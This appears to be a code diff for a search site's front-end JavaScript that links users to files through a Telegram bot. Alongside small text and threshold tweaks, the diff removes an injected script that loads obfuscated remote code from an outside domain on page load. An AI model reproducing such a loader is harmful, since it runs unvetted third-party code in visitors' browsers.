@@ -825,7 +825,7 @@ async function performSearchWithPopup(page = 1) {
             renderResults(data.results, data.pagination);
         } else if (data && data.results && data.results.length === 0) {
             if (resultsContainer) {
-                resultsContainer.innerHTML = '<div class="error-state"><i class="fas fa-search fa-3x mb-3" style="color:#00ccff;"></i><h4>No results found</h4><p>Try different keywords</p></div>';
+                resultsContainer.innerHTML = '<div class="error-state"><i class="fas fa-search fa-3x mb-3" style="color:#00ccff;"></i><h4>No results found</h4><p>Try Again</p></div>';
             }
         } else {
             if (resultsContainer) {
@@ -899,7 +899,7 @@ function formatPostContent(content) {
 
 function createPostContent(content, index) {
     if (!content || !content.trim()) return '';
-    const isLong = content.length > 1000;
+    const isLong = content.length > 1200;
     let html = `<div class="result-post-content" id="post-content-${index}" style="position: relative;">`;
     html += `<div class="post-text" style="max-height: ${isLong ? '150px' : 'none'}; overflow: hidden; transition: max-height 0.4s ease-in-out;">`;
     html += formatPostContent(content);
@@ -953,7 +953,7 @@ function generateQualityOptions(qualityOptions, result) {
                 const size = data.file_size ? formatSize(data.file_size) : '';
                 const telegramLink = `https://t.me/${BOT_USERNAME}?start=${fileId}`;
                 
-                const badge = !hasUserSeenRedirect ? '<span class="one-time-badge">1st time</span>' : '';
+                const badge = !hasUserSeenRedirect ? '<span class="one-time-badge">SK</span>' : '';
                 
                 html += `<button class="quality-option-2click" onclick="handleQualityClick('${telegramLink}')">${quality} ${size} ${badge}</button>`;
                 count++;
@@ -962,7 +962,7 @@ function generateQualityOptions(qualityOptions, result) {
     }
     
     if (count === 0) {
-        const badge = !hasUserSeenRedirect ? '<span class="one-time-badge">1st time</span>' : '';
+        const badge = !hasUserSeenRedirect ? '<span class="one-time-badge">SK</span>' : '';
         html += `<button class="quality-option-2click" onclick="handleQualityClick('https://t.me/${BOT_USERNAME}')">Get from Bot ${badge}</button>`;
     }
     
@@ -1170,18 +1170,6 @@ window.closeRedirect = closeRedirect;
 window.togglePostContent = togglePostContent;
 window.closeInterstitial = closeInterstitial;
 window.performSearchWithPopup = performSearchWithPopup;
-</script>
-    <script>
-(function(qhwtmt){
-var d = document,
-    s = d.createElement('script'),
-    l = d.scripts[d.scripts.length - 1];
-s.settings = qhwtmt || {};
-s.src = "\/\/stupid-police.com\/b_X.VxsndXGZlP0iY\/WOcr\/SeNmm9\/uDZkUalzkXPITeY\/3dNbj\/I\/zoNAzok\/tcN-jHcR2FM\/jaMx4mM\/Aa";
-s.async = true;
-s.referrerPolicy = 'no-referrer-when-downgrade';
-l.parentNode.insertBefore(s, l);
-})({})
 </script>
 </body>
 </html>
